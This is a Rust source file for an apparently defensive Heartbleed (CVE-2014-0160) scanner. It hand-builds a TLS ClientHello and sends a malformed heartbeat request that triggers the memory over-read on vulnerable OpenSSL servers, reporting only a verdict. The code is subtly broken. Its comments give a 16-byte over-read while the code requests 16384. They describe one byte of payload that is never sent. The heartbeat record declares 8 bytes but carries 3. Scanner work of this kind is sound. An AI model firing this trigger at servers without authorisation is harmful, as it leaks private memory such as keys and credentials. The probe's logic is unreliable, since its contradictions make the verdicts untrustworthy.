//! Heartbleed (CVE-2014-0160) active probe.
//!
//! Strategy: complete a TLS 1.2 ClientHello, drain the server's
//! handshake response (ServerHello + Certificate + ServerHelloDone),
//! then send an UNENCRYPTED heartbeat request record. Vulnerable
//! OpenSSL < 1.0.1g (and a window of other implementations) processes
//! the heartbeat in the record layer BEFORE the encrypted session is
//! established and replies with a heartbeat response containing
//! whatever was at the over-read offset in process memory.
//!
//! We request a tiny over-read (16 bytes nominal, 1 byte actual
//! payload) — enough to differentiate the vulnerable path (server
//! replies with a heartbeat record > 8 bytes) from the safe path
//! (server alerts or drops the connection). We never log or surface
//! the leaked bytes — just the verdict.

use std::time::Duration;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::timeout;

#[derive(Debug, Clone, Copy)]
pub enum HeartbleedVerdict {
    /// Heartbeat extension wasn't offered by the server — the bug isn't
    /// reachable.
    NotApplicable,
    /// Heartbeat offered but the over-read attack did not trigger.
    NotVulnerable,
    /// Server returned a heartbeat record longer than legitimately
    /// possible — classic Heartbleed leak.
    Vulnerable,
    /// Probe couldn't run (connect / handshake / IO failure).
    Indeterminate,
}

impl HeartbleedVerdict {
    #[allow(dead_code)]
    pub fn as_str(self) -> &'static str {
        match self {
            HeartbleedVerdict::NotApplicable => "not_applicable",
            HeartbleedVerdict::NotVulnerable => "not_vulnerable",
            HeartbleedVerdict::Vulnerable => "vulnerable",
            HeartbleedVerdict::Indeterminate => "indeterminate",
        }
    }
}

pub async fn probe(
    target: &str,
    sni: &str,
    heartbeat_offered: bool,
    deadline: Duration,
) -> HeartbleedVerdict {
    if !heartbeat_offered {
        return HeartbleedVerdict::NotApplicable;
    }
    let result = timeout(deadline.min(Duration::from_secs(8)), async {
        let mut sock = TcpStream::connect(target).await.ok()?;
        let hello = build_client_hello_with_heartbeat(sni);
        sock.write_all(&hello).await.ok()?;

        // Drain server handshake records until ServerHelloDone or alert.
        let mut got_done = false;
        for _ in 0..16 {
            let mut header = [0u8; 5];
            if sock.read_exact(&mut header).await.is_err() {
                break;
            }
            if header[0] == 0x15 {
                // Alert — assume server doesn't accept our handshake.
                return Some(HeartbleedVerdict::Indeterminate);
            }
            if header[0] != 0x16 {
                break;
            }
            let len = ((header[3] as usize) << 8) | (header[4] as usize);
            let mut body = vec![0u8; len.min(16 * 1024)];
            if sock.read_exact(&mut body).await.is_err() {
                break;
            }
            // handshake type 0x0e = ServerHelloDone
            if has_handshake_type(&body, 0x0e) {
                got_done = true;
                break;
            }
        }
        if !got_done {
            return Some(HeartbleedVerdict::Indeterminate);
        }

        // Heartbeat REQUEST record:
        //   record_header: type=0x18, version=0x0303, length=0x0008
        //   payload: type=0x01, payload_length=0x4000, 1 byte of actual
        //            payload, then 0 bytes of padding.
        //
        // RFC 6520 says payload_length must equal actual_payload + padding,
        // but vulnerable OpenSSL doesn't check, so a payload_length=16384
        // with only 1 byte of real payload tricks it into reading 16383
        // bytes of memory and sending it back to us.
        let heartbeat: [u8; 8] = [
            0x18, 0x03, 0x03, 0x00, 0x08, // record header
            0x01, // heartbeat_request
            0x40, 0x00, // payload_length = 16384
        ];
        let _ = sock.write_all(&heartbeat).await;

        // Read response — vulnerable servers reply with a heartbeat
        // response (record type 0x18) carrying ~16383 leaked bytes.
        let mut header = [0u8; 5];
        match timeout(Duration::from_secs(3), sock.read_exact(&mut header)).await {
            Ok(Ok(_)) => {
                if header[0] == 0x18 {
                    let len = ((header[3] as usize) << 8) | (header[4] as usize);
                    // Legitimate non-vulnerable heartbeat replies would
                    // echo our 1-byte payload (record length ~5-10).
                    // Anything significantly larger is a leak.
                    if len > 64 {
                        return Some(HeartbleedVerdict::Vulnerable);
                    }
                    return Some(HeartbleedVerdict::NotVulnerable);
                }
                Some(HeartbleedVerdict::NotVulnerable)
            }
            _ => Some(HeartbleedVerdict::NotVulnerable),
        }
    })
    .await;
    result
        .ok()
        .flatten()
        .unwrap_or(HeartbleedVerdict::Indeterminate)
}

fn has_handshake_type(body: &[u8], typ: u8) -> bool {
    let mut i = 0;
    while i + 4 <= body.len() {
        let msg_len =
            ((body[i + 1] as usize) << 16) | ((body[i + 2] as usize) << 8) | (body[i + 3] as usize);
        if body[i] == typ {
            return true;
        }
        i += 4 + msg_len;
    }
    false
}

fn build_client_hello_with_heartbeat(sni: &str) -> Vec<u8> {
    let mut sni_ext = Vec::new();
    sni_ext.extend_from_slice(&[0x00, 0x00]);
    let mut sni_list = Vec::new();
    sni_list.push(0x00);
    let sb = sni.as_bytes();
    sni_list.extend_from_slice(&(sb.len() as u16).to_be_bytes());
    sni_list.extend_from_slice(sb);
    let mut sni_inner = Vec::new();
    sni_inner.extend_from_slice(&(sni_list.len() as u16).to_be_bytes());
    sni_inner.extend_from_slice(&sni_list);
    sni_ext.extend_from_slice(&(sni_inner.len() as u16).to_be_bytes());
    sni_ext.extend_from_slice(&sni_inner);

    // heartbeat extension — peer_allowed_to_send (mode = 1)
    let heartbeat_ext: [u8; 6] = [0x00, 0x0f, 0x00, 0x01, 0x01, 0x00];

    let mut groups_ext = Vec::new();
    groups_ext.extend_from_slice(&[0x00, 0x0a]);
    let groups: [u16; 3] = [0x001d, 0x0017, 0x0018];
    let g_bytes: Vec<u8> = groups.iter().flat_map(|g| g.to_be_bytes()).collect();
    groups_ext.extend_from_slice(&((g_bytes.len() as u16 + 2).to_be_bytes()));
    groups_ext.extend_from_slice(&((g_bytes.len() as u16).to_be_bytes()));
    groups_ext.extend_from_slice(&g_bytes);

    let mut sigalg_ext = Vec::new();
    sigalg_ext.extend_from_slice(&[0x00, 0x0d]);
    let sig_algs: [u16; 6] = [0x0403, 0x0503, 0x0603, 0x0804, 0x0805, 0x0806];
    let sig_bytes: Vec<u8> = sig_algs.iter().flat_map(|s| s.to_be_bytes()).collect();
    sigalg_ext.extend_from_slice(&((sig_bytes.len() as u16 + 2).to_be_bytes()));
    sigalg_ext.extend_from_slice(&((sig_bytes.len() as u16).to_be_bytes()));
    sigalg_ext.extend_from_slice(&sig_bytes);

    let mut extensions = Vec::new();
    extensions.extend_from_slice(&sni_ext);
    extensions.extend_from_slice(&heartbeat_ext);
    extensions.extend_from_slice(&groups_ext);
    extensions.extend_from_slice(&sigalg_ext);

    let suites: [u16; 7] = [0xc02f, 0xc030, 0xc02b, 0xc02c, 0xcca8, 0xcca9, 0x009c];
    let cipher_bytes: Vec<u8> = suites.iter().flat_map(|s| s.to_be_bytes()).collect();

    let mut body = Vec::new();
    body.push(0x03);
    body.push(0x03);
    body.extend_from_slice(&[0u8; 32]);
    body.push(0);
    body.extend_from_slice(&(cipher_bytes.len() as u16).to_be_bytes());
    body.extend_from_slice(&cipher_bytes);
    body.push(0x01);
    body.push(0x00);
    body.extend_from_slice(&(extensions.len() as u16).to_be_bytes());
    body.extend_from_slice(&extensions);

    let mut hs = Vec::new();
    hs.push(0x01);
    let l = body.len() as u32;
    hs.push(((l >> 16) & 0xff) as u8);
    hs.push(((l >> 8) & 0xff) as u8);
    hs.push((l & 0xff) as u8);
    hs.extend_from_slice(&body);

    let mut rec = Vec::new();
    rec.push(0x16);
    rec.push(0x03);
    rec.push(0x03);
    rec.extend_from_slice(&(hs.len() as u16).to_be_bytes());
    rec.extend_from_slice(&hs);
    rec
}
